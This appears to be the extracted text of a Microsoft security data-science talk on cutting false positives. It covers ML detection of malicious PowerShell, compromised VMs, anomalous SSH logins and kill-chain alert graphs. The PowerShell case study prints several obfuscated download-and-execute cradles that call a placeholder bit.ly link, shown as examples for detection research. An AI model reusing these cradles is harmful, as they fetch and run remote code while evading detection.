Reducing Alert Fatigue in Security Analysts
Sharon Xia (@sharonxia) Ram Shankar Siva Kumar (@ram_ssk) Azure Security Data Science

Current state of Security

Red Team Kill Chain

Recon

Delivery

Foothold

Persist

Move

Elevate

Exfiltrate

Blue Team Kill Chain

Recon Gather

Delivery Detect

Foothold Alert

Persist

Move

Elevate

Exfiltrate

Triage

Context

Plan

Execute

for Attack Detection

Blue Team Kill Chain

Recon

Delivery

Foothold

Persist

Move

Gather Detect

Alert

Triage Context Plan Execute

Elevate

Exfiltrate

for Attack Disruption

Biggest Roadblock for Attack Disruption
False Positives

False Positives
Lose ability to triage

Recon

Delivery

Foothold

Persist

Move

Gather Detect

Alert

Triage Context Plan Execute

Elevate

Exfiltrate

You cannot salvage a false positive with just visualization. You need better solutions.

6.5
trillion
signals analyzed
daily

470
billion
Emails analyzed for
malware

630
billion
authentications per month

5
billion
monthly threats thwarted by Windows Defender AV

More than
200
Cloud services in Microsoft

Mindshift 1: Focus on Successful Detection
Successful detection

More domain knowledge

Security domain knowledge

More useful

Usefulness of alerts

Little domain knowledge

Outlier

Anomaly

Basic

Advanced

Sophistication of algorithm

Less useful

Successful detections incorporate domain knowledge through disparate datasets and rules

Mindshift 2: Labels beyond feedback

Automated Attack bots

Domain experts, customers who provide feedback
from Alerts

Labels from other product
groups
(including O365, Windows Seville)
Microsoft

Surgical Red team exercises
(OneHunt)

Bug Bounty

MSRC

Mindshift 3: Learning to defend the Cloud

Network ACL, Ingress
& Egress Monitoring

Internet

Private Network
Active Directory

File Server

Application SQL

Server

Server

Domain Controller

Azure Storage

Azure VM (IaaS)

Azure PaaS Service

Azure SQL Database

Azure VNET

Azure Analytics (Logging)

VM VM

Azure Key Vault Azure Document DB

Azure Redis

Switching to cloud defender's mindset
Server Domain Domain Admin Pass the Hash Private IPs
ACLs RDP/SSH

Mindshift 4: Solving for classes of tasks

Traditional Machine Learning

Learning from Related tasks

Different tasks

Source tasks

Target task

Learning system

Learning system

Learning system

Learning system

Source: Pan, Sinno Jialin, and Qiang Yang. "A survey on transfer learning." IEEE Transactions on knowledge and data engineering

Mindshift 5: Embrace Empathy

Protecting assets in and using the cloud

Host

Identity

Service

Cloud-based monitoring, storage and ML

CASE STUDY 1
Detecting Malicious PowerShell commands

Malicious usage of PowerShell

PowerShell obfuscation
Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://bit.ly/L3g1t")
Invoke-Expression (New-Object Net.WebClient). "`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('ht'+'tps://bit.ly/L3g1t')
Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T"). "`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('ht'+'tps://bit.ly/L3g1t')
Invoke-Expression (& (GCM *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T"). "`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('ht'+'tps://bit.ly/L3g1t')
. ((${`E`x`e`c`u`T`i`o`N`C`o`N`T`e`x`T}."`I`N`V`o`k`e`C`o`m`m`A`N`d"). "`N`e`w`S`c`R`i`p`T`B`l`o`c`k"((& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('ht'+'tps://bit.ly/L3g1t')))

Decoding PowerShell command lines

Rules don't work well, because too many regexes needs to be written
Classical machine learning doesn't work well, because every command line is unique No discernable pattern

Command line: before obfuscation
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/ L3g1t')
Command line: after obfuscation
&( "I"+ "nv" +"OK"+"e-EXPreSsIon" ) (&( "newO"+ "BJ"+"Ect") ('Net' +'.We'+'bClient' ) ).( 'dOWnlO' +'aDS'+'TrinG').Invoke( ('http://bi'+'t.ly/'+'L3' +'g1t' ))
Source: Bohannon, Daniel. "Invoke Obfuscation", BlueHat 2016.

Overview

Previous approach
Classification using n-grams and BagOfWords
Results: True positive rate = 67% False positive rate = 0.1%

Hypothesis
Deep learning methods are capable of efficient and
precise detection of malicious PowerShell commands

Solution
Capture semantic relationship in command lines using contextual embedding Use the learned embeddings to classify observed command lines

Contextual Embedding
Overview

·

·

·

· queen ­ woman + man  king

Contextual Embedding
Learned examples

Distinguish what doesn't match

$i $j

$k $true $x

bypass normal minimized maximized hidden

Linear relationships DownloadFile - $destfile + $str  DownloadString
'Export-CSV'- $csv + $html  'ConvertTo-html'

Dataset

368k unlabeled .ps1 and .psm files

Tokenize

1.4M
distinct tokens

Technique overview

Results
Model performance and productization

Model trained multiple times per day Size of data: 3.5M records/month Completed within hours
Classification runs on demand Completed within seconds

Productized in Microsoft Defender ATP

Dataset
Previous Method Deep Learning

True positive rate
67%
89%

False positive rate
0.1%
0.1%

22 points improvement!

Paper: https://arxiv.org/abs/1905.09538

CASE STUDY 2
Detecting Compromised Virtual Machines

Overview

Previous approach
Rules and Heuristics
Results: True positive rate = 55% False positive rate = 0.1%

Hypothesis
A virtual machine that is sending out spam is most likely compromised

Solution
Leverage the spam information from Office 365 alongside IPFIX from Azure VMs

Dataset
Azure

IPFIX Features

SPAM

WHY IS NETWORK DATA GOOD FOR DETECTION?  No installation required ­ running on
all Azure tenants  No overload on the VM  Resilient ­ cannot be maliciously
turned off  OS independent
EXAMPLES
· All ports with traffic · Number of connections · Aggregate protocols used · Which TCP flags combination exist
Spam Tags come from O365!

Technique Overview

IPFIX data

6,569 spam labeled IPFIX data

Benign IPFIX data

Machine Learning

New Case



Automated Compromise Detection

Machine Learning Deep Dive
Input data for 1st iteration

Results

Weak learner at 1st iteration

Machine Learning Deep Dive
Input data for 2nd iteration

The data points that were incorrectly categorized by the weak learner in the first iteration (the positive examples) are now weighted more.
Simultaneously, the correct points are down weighted.

Learner at 2nd iteration

Results

Machine Learning Deep Dive
Input data for 3rd iteration

The data points that were incorrectly categorized in the second iteration (the negative examples) are now weighted more.
Simultaneously, the correct points are down weighted.

Learner at 3rd iteration

Results

+

+

Final result is a combination of learners from each iteration

Results
Model performance and productization

Model trained multiple times per day Size of data: 360 GB/dat Completed within minutes
Classification runs on demand Completed within seconds

Productized in Azure Security Center

Dataset
Previous Method Deep Learning

True positive rate
55%
81%

False positive rate
0.1%
0.1%

26 points improvement!

CASE STUDY 3
Anomalous SSH login

SecOp ML Journey

Anomalous Login

Overview

Previous approach
No previous approach for SSH geo login anomaly at
cloud scale

Hypothesis
An SSH login is geo anomalous if the time taken between two logins is from two places that
are far apart

Solution
Reuse the geo login anomaly trained on Azure Active Directory to this problem

Geo Login Anomaly Detection (GLAD)

45-day window
Weighted based on frequency/time last seen

User 1 User 2 User 3 User 4

ComcastBellevue
MicrosoftRedmond
VerizonSeattle
MicrosoftCambridge
VerizonBoston

Partial mapping between locations Constrained within tenants

User 1 1.0 0.8 0.7 User 2 0.8 1.0 0.7

User 3 0.7 0.7 1.0 0.3

User 4

0.3 1.0

Random walk with restarts
Partial mapping to other similar Geo locations

User Location

Reachability

3 Comcast-Bellevue

965.0

3 Comcast-Redmond

875.0

3 Microsoft-Redmond 978.0

3 Verizon-Seattle

425.0

3 Verizon-Bellevue

350.0

3 Microsoft-Cambridge 275.0

3 Verizon-Boston

152.0

Challenges with opening up Geo Login Anomaly Detection

Heavyweight
Reachability is compute-intensive, requires sampling

Domain-restricted to Azure Active Directory Logins
Uses features not available in SSH

Uses hand-crafted features
Don't transfer as well

Inflexible
Can't easily add new data patterns

Technique overview
Recurrent Neural Networks

·

Bulky GLAD System

·

· ·
LSTM Model
·

Dataset

SSH Login
t1

SSH Login
t2

SSH Login
t3

·

·

Time

·

previous state (64) previous state (128) previous state (256)

Scoring
Output (2)

Dense layer (2) LSTM layer 3 (64) LSTM layer 2 (128) LSTM layer 1 (256)

Featurized input (15)

SSH Login t1 SSH Login t2 Time

SSH Login t3

next state (64) next state (128) next state (256)

Data pipeline

Cosmos

Login events

Input EventHub
IP-based geolocation information

Scored GLAD data (9 months)

GPU-accelerated model training

Exported deep neural network model

Databricks

Geo-enriched login events

Featurized login events

Per-user aggregate state

Suspicious scored events

Per-user DNN state

Product EventHub

IP Geolocation Database

Azure Blob Storage

Results
Model performance and productization

Builds user profiles based on 2-week data Size of data: varies by customer Completed within seconds
Runs on streaming mode Mean Time To Detection (MTTD): seconds

Dataset
Previous Method LSTM

False positive rate
N/A As well as GLAD (0.01%)

Private Preview in Azure Sentinel

CASE STUDY 4
Service Level Detection

Anomalous DLL: New process uploading: Large transfer:

Anomalous DLL:

alert type

process

launched as

on

user

host

New process uploading:

to

on

alert type

process

remote host

host

Large transfer: 50MB to

from

alert type

remote host

on

process

host

sposql11 anomalousdll

rundll32.exe

CFE110095

newprocupload

sqlagent.exe

40.114.40.133

largetransfer SQL11006

Overview

Previous approach
No previous approach

Hypothesis
Instead of alerting on separate online services, consolidate into
high fidelity cases

Solution
Construct a graph of the different alerts and use probabilistic kill chain to combine disparate events

Dataset
Alerts and Raw events from Online Services

Azure AD Identity Protection

Microsoft Cloud App Security

Azure Security Center

Azure Advanced Threat Protection

Azure Information Protection

AWS

Palo Alto Networks

Cisco ASA

Barracuda

Office 365

Symantec

Fortinet

F5

Check Point

Raw Events to High Fidelity Incidents
Compromise identity > Create Service Principal > Add it as Admin to subscription > Exfiltrate data

300B
identity logins
4.1B
AAD admin actions
3.2B
Azure admin actions

28M
identity detections
20M
anomalous AAD actions
2M
anomalous Azure actions

320
subgraphs
Identity detection Credential access
New service principal created
SP added as admin Persistance

*All metrics are for a month

18
cases

Technique overview
Graph Powered ML Detection

45-day window
Vertex = Entity (user, IP address, VM); Edge is any connection between them
Events from Microsoft and Partner Security products

End of Step 1: Graph with billions of nodes and Edges Goal: Prune Graph using Probabilistic Kill chain
Time Bound:
Complete killchain:
Commonalities:

To reduce the noise further, we do one more round of scoring. End of Scoring Step: High Fidelity Cases
Features used in scoring · Similar Attacks Across
Tenants · Number of High Impact
Activity in the Graph · Does the sub graph connect
with other graphs?

Results
Model performance and productization

Model trained in regular intervals Size of data: Billions of Alerts per day Completed within hours
Classification runs multiple times a day Completed in the order of hours

Productized in Azure Sentinel

Dataset

True

False

positive rate positive rate

Previous Method N/A

N/A

Graph Powered ML 93%

1.4%

Conclusion

· ·

·

·

·

Resources
· https://docs.microsoft.com/en-us/windows/security/threatprotection/windows-defender-antivirus/utilize-microsoftcloud-protection-windows-defender-antivirus
· https://aka.ms/azuresentinel
· https://azure.microsoft.com/en-us/blog/reducing-securityalert-fatigue-using-machine-learning-in-azure-sentinel/
· https://arxiv.org/abs/1709.07095

Ramk@Microsoft.com @ram_ssk

© Copyright Microsoft Corporation. All rights reserved.

